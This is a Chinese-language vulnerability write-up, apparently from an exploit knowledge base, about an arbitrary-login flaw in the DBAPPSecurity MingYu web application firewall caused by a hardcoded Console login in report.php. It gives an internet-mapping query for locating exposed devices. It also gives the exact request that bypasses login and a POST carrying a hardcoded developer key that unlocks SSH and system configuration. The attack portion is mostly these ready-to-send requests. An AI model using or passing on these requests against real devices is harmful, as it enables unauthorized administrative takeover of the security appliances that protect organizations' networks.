# 安恒 明御WEB应用防火墙 report.php 任意用户登录漏洞

## 漏洞描述

安恒 明御WEB应用防火墙 report.php文件存在硬编码设置的Console用户登录，攻击者可以通过漏洞直接登录后台

## 漏洞影响

<a-checkbox checked>安恒 明御WEB应用防火墙</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="安恒信息-明御WAF"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1658456619582-0ab677aa-d84e-47b1-96b2-481c66831947.png)

验证POC

```php
/report.m?a=rpc-timed
```

![img](../../../.vuepress/public/img/1658456645745-b626ae63-660a-4726-ad5d-efd6c4def0ee.png)

再访问主页面跳转配置页面

![img](../../../.vuepress/public/img/1658456684801-06c03840-87bc-41c5-a234-b8f0aa1ea244.png)

发送请求包配置系统SSH等

```php
POST /system.m?a=reserved
  
key=!@#dbapp-waf-dev-reserved#@!
```

![img](../../../.vuepress/public/img/1658541896143-bbbe633a-ce06-4e44-bb83-0806a3dde1a6.png)